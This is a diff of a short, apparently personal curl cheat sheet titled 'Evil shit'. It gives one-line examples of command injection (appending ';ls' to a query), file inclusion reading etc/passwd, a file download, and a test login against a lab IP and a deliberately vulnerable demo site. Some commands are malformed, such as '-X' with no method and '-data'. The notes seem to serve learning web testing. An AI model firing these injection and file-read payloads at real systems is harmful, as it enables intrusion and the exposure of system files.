@@ -1,7 +1,7 @@
 #1. Evil shit
 
 #Command Injection
-curl “http://192.168.0.16/commandexec/example1.php?127.0.0.1;ls”
+curl “http://192.168.0.16/example.php?127.0.0.1;ls”
 
 #Download File from URL
 curl -O https://the.earth.li/~sgtatham/putty/latest/putty.exe
@@ -10,7 +10,7 @@ curl -O https://the.earth.li/~sgtatham/putty/latest/putty.exe
 curl -v -X http://www.google.com
 
 #File Inclusion
-curl http://192.168.0.16/fileincl/example.php?page=etc/passwd
+curl http://192.168.0.16/example.php?page=etc/passwd
 
 #HTTP Authentication
 curl -data “uname=test&pass=test” http://testphp.vulnweb.com/userinfo.php
